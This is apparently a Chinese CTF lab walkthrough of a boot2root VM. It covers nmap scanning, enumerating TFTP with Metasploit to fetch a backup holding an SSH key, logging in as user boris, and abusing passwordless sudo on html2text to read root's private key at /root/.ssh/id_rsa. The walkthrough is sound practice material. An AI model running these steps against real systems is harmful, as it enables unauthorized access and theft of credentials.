## 复盘*

## 靶机地址

[Proton Drive](https://drive.proton.me/urls/VTN6QXXPHM#meCFoaXjs2JI)

![image-20250324171917018](assets/image-20250324171917018.png)







## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250324172004065](assets/image-20250324172004065.png)

创建文件夹，用来存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250324172030164](assets/image-20250324172030164.png)

确定靶机ip：

192.168.1.8



#### 端口扫描

```
nmap --min-rate 10000 -p- -sT 192.168.1.8 -oA ./nmapscan/ports
```

![image-20250324172118448](assets/image-20250324172118448.png)

开放了：

- 22 ssh
- 80 http



#### 提取端口信息

```
ports
```

![image-20250324172148124](assets/image-20250324172148124.png)



#### 详细结果扫描

```
nmap -sCV -O -p 22,80 192.168.1.8 -oA ./nmapscan/detail
```

![image-20250324172228598](assets/image-20250324172228598.png)

分析：

- 22 ssh OpenSSH 8.4p1
- 80 http Apache httpd 2.4.56
- Debian系统



#### UDP扫描

```
nmap -sU --top-ports 20 192.168.1.8 -oA nmapscan/udp
```

![image-20250324172348863](assets/image-20250324172348863.png)

分析：

- 69 tftp 可能开放



### 80端口

#### 访问192.168.1.8

![image-20250324172444330](assets/image-20250324172444330.png)

```
Hello worker!
It has sensitive exposed files, fix it as soon as possible.

IT Department

你好，工作人员！
有敏感的暴露文件，请尽快修复。

IT 部门
```

提示存在敏感文件泄露

查看源码，无信息



#### dirsearch进行目录扫描

```
dirsearch -u http://192.168.1.8
```

![image-20250324172557949](assets/image-20250324172557949.png)

无结果



#### gobuster进行目录扫描

```
gobuster dir -u http://192.168.1.8 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![image-20250324172713910](assets/image-20250324172713910.png)

gobuster无结果



80端口无线索，可能是tftp中存在文件泄露



### 69端口

#### 利用msfconsole枚举tftp中的文件

```
msfconsole
search auxiliary/scanner/tftp
```

![image-20250324172936708](assets/image-20250324172936708.png)

![image-20250324172944337](assets/image-20250324172944337.png)

```
use 2
show options
set rhosts 192.168.1.8
run
```

![image-20250324173031384](assets/image-20250324173031384.png)

得到一个文件名

- backup-config



#### 连接tftp下载文件

```
tftp 192.168.1.8
get backup-config
quit
```

![image-20250324173209349](assets/image-20250324173209349.png)



#### 查看backup-config

![image-20250324173235345](assets/image-20250324173235345.png)

pk，zip文件

```
file backup-config
```

![image-20250324173255092](assets/image-20250324173255092.png)

确定是zip

解压

```
unzip
ls
cd backup
ls
```

![image-20250324173329916](assets/image-20250324173329916.png)

![image-20250324173348793](assets/image-20250324173348793.png)

![image-20250324173359212](assets/image-20250324173359212.png)

存在一个私钥和一个ssh配置文件



#### 查看ssh配置文件

```
cat sshd_config
```

![image-20250324173437246](assets/image-20250324173437246.png)

最下面存在一个用户名

- boris

也就是我们可以尝试用私钥登录该用户



### 22端口

#### 修改私钥文件权限

![image-20250324173544925](assets/image-20250324173544925.png)



#### ssh连接

```
ssh boris@192.168.1.8 -i id_rsa
```

![image-20250324173601128](assets/image-20250324173601128.png)

成功



## 提权

### 得到第一个flag

```
ls
cat user.txt
```

![image-20250324173637075](assets/image-20250324173637075.png)



### 执行sudo -l

```
sudo -l
```

![image-20250324173615935](assets/image-20250324173615935.png)

可以无密码执行html2text



### 查看html2text的说明文档

```
man html2text > 1
cat 1
```

![image-20250324174025053](assets/image-20250324174025053.png)

也就是我们可以利用html2text配合sudo权限读取任意文件





### 读取root用户私钥

```
sudo html2text /root/.ssh/id_rsa
```

![image-20250324174858980](assets/image-20250324174858980.png)

保存到本地



### 修改私钥文件权限

```
chmod +600 root_id_rsa
```

![image-20250324174939999](assets/image-20250324174939999.png)



### ssh登录root用户

```
ssh root@192.168.1.8 -i root_id_rsa
```

![image-20250324174949940](assets/image-20250324174949940.png)

成功



### 得到第二个flag

```
cd /root
ls
cat r000000000000000000000000000000t.txt
```

![image-20250324175118980](assets/image-20250324175118980.png)